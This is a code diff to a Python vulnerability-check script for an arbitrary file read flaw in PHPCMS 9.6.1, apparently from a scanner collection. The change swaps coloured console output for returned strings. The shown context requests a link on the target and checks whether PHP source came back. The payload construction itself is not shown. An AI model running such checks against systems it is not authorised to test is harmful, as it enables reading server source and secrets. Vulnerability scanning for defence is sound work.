@@ -9,8 +9,8 @@ description: phpcms最新版本任意文件读取，漏洞原理见来源页面�
 import re
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class phpcms_v961_fileread_BaseVerify:
     def __init__(self, url):
@@ -41,12 +41,12 @@ class phpcms_v961_fileread_BaseVerify:
             link = re.search(pattern, req3.text).group(1)
             req4 = requests.get(self.url+"/index.php"+link, headers=headers, verify=False)
             if r"<?php" in req4.text and r"phpsso" in req4.text:
-                cprint("[+]存在phpcms 9.6.1任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在phpcms 9.6.1任意文件读取漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = phpcms_v961_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
